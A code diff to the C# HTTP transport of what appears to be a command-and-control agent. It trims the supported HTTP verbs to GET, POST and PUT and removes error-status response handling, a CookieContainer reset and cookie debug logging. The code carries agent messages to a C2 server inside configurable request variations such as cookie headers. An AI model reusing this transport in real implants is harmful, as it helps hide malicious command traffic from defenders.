@@ -364,7 +364,7 @@ namespace HttpxTransport
 
             // Select HTTP method variation based on message size
             // Default behavior: use POST for large messages (>500 bytes), GET for small messages
-            // This supports any HTTP method (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD) from config
+            // Only supports GET, POST, and PUT methods
             VariationConfig variation = null;
 #if DEBUG
             DebugWriteLine($"[SendRecv] Message size: {messageBytes.Length} bytes");
@@ -372,16 +372,16 @@ namespace HttpxTransport
             if (messageBytes.Length > 500)
             {
 #if DEBUG
-                DebugWriteLine("[SendRecv] Large message (>500 bytes), selecting POST/PUT/PATCH variation");
+                DebugWriteLine("[SendRecv] Large message (>500 bytes), selecting POST/PUT variation");
 #endif
-                // Try POST, PUT, PATCH in order until we find a valid configuration
-                variation = Config.GetConfiguredVariation("post") ?? Config.GetConfiguredVariation("put") ?? Config.GetConfiguredVariation("patch");
+                // Try POST, then PUT in order until we find a valid configuration
+                variation = Config.GetConfiguredVariation("post") ?? Config.GetConfiguredVariation("put");
                 
                 // Fall back to GET if no large-message methods are configured
                 if (variation == null)
                 {
 #if DEBUG
-                    DebugWriteLine("[SendRecv] No POST/PUT/PATCH configured, falling back to GET");
+                    DebugWriteLine("[SendRecv] No POST/PUT configured, falling back to GET");
 #endif
                     variation = Config.GetConfiguredVariation("get");
                 }
@@ -389,16 +389,16 @@ namespace HttpxTransport
             else
             {
 #if DEBUG
-                DebugWriteLine("[SendRecv] Small message (<=500 bytes), selecting GET/HEAD/OPTIONS variation");
+                DebugWriteLine("[SendRecv] Small message (<=500 bytes), selecting GET variation");
 #endif
-                // Small messages: use GET, HEAD, or OPTIONS
-                variation = Config.GetConfiguredVariation("get") ?? Config.GetConfiguredVariation("head") ?? Config.GetConfiguredVariation("options");
+                // Small messages: use GET
+                variation = Config.GetConfiguredVariation("get");
                 
-                // Fall back to POST if no small-message methods are configured
+                // Fall back to POST if GET is not configured
                 if (variation == null)
                 {
 #if DEBUG
-                    DebugWriteLine("[SendRecv] No GET/HEAD/OPTIONS configured, falling back to POST");
+                    DebugWriteLine("[SendRecv] No GET configured, falling back to POST");
 #endif
                     variation = Config.GetConfiguredVariation("post");
                 }
@@ -504,9 +504,6 @@ namespace HttpxTransport
                 // Create HttpWebRequest for full control over headers
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                 request.Method = variation.Verb;
-                // Ensure CookieContainer is null so we can manually set Cookie header
-                // If CookieContainer is set, manual Cookie header setting may be ignored
-                request.CookieContainer = null;
 #if DEBUG
                 DebugWriteLine($"[SendRecv] HTTP Method: {variation.Verb}");
                 DebugWriteLine($"[SendRecv] Final URL: {url}");
@@ -629,11 +626,6 @@ namespace HttpxTransport
                         request.Headers[HttpRequestHeader.Cookie] = cookieHeader;
 #if DEBUG
                         DebugWriteLine($"[SendRecv] Cookie header set: {variation.Client.Message.Name} (value length: {cookieValue.Length} chars)");
-                        // Show preview of cookie value (first 100 chars) and encoded length
-                        string cookiePreview = cookieValue.Length > 100 ? cookieValue.Substring(0, 100) + "..." : cookieValue;
-                        DebugWriteLine($"[SendRecv] Cookie value preview: {cookiePreview}");
-                        DebugWriteLine($"[SendRecv] Cookie header length: {cookieHeader.Length} chars");
-                        DebugWriteLine($"[SendRecv] Cookie header (first 200 chars): {cookieHeader.Length > 200 ? cookieHeader.Substring(0, 200) + "..." : cookieHeader}");
 #endif
                         break;
 
@@ -672,7 +664,7 @@ namespace HttpxTransport
                 }
 
                 // Get response
-                string response = null;
+                string response;
                 HttpWebResponse httpResponse = null;
 #if DEBUG
                 DebugWriteLine($"[SendRecv] Sending {variation.Verb} request to: {url}");
@@ -708,53 +700,9 @@ namespace HttpxTransport
                         }
                     }
                 }
-                catch (WebException webEx)
-                {
-                    // Some C2 servers return 404/other error codes but still include valid response data
-                    // Check if we have an HttpWebResponse with a body we can read
-                    if (webEx.Response is HttpWebResponse errorResponse)
-                    {
-                        httpResponse = errorResponse;
-#if DEBUG
-                        DebugWriteLine($"[SendRecv] WebException caught, but response available: {errorResponse.StatusCode} {errorResponse.StatusDescription}");
-                        DebugWriteLine($"[SendRecv] Attempting to read response body despite error status");
-#endif
-                        using (Stream responseStream = errorResponse.GetResponseStream())
-                        {
-                            if (responseStream != null)
-                            {
-                                using (StreamReader reader = new StreamReader(responseStream))
-                                {
-                                    response = reader.ReadToEnd();
-#if DEBUG
-                                    DebugWriteLine($"[SendRecv] Successfully read response body ({response.Length} chars) despite error status");
-#endif
-                                    // Continue processing - don't treat as error if we got response data
-                                }
-                            }
-                            else
-                            {
-                                // No response stream, rethrow the exception
-                                throw;
-                            }
-                        }
-                    }
-                    else
-                    {
-                        // No HttpWebResponse, rethrow the exception
-                        throw;
-                    }
-                }
                 finally
                 {
-                    // Don't close httpResponse here if we're going to use it later
-                    // It will be closed after we process the response
-                }
-
-                // Ensure we got a response
-                if (response == null)
-                {
-                    throw new InvalidOperationException("No response data received from server");
+                    httpResponse?.Close();
                 }
 
                 HandleDomainSuccess();
@@ -766,9 +714,6 @@ namespace HttpxTransport
                 byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
                 
                 string responseString = Encoding.UTF8.GetString(untransformedData);
-                
-                // Close response after we've read all data
-                httpResponse?.Close();
                 
 #if DEBUG
                 try
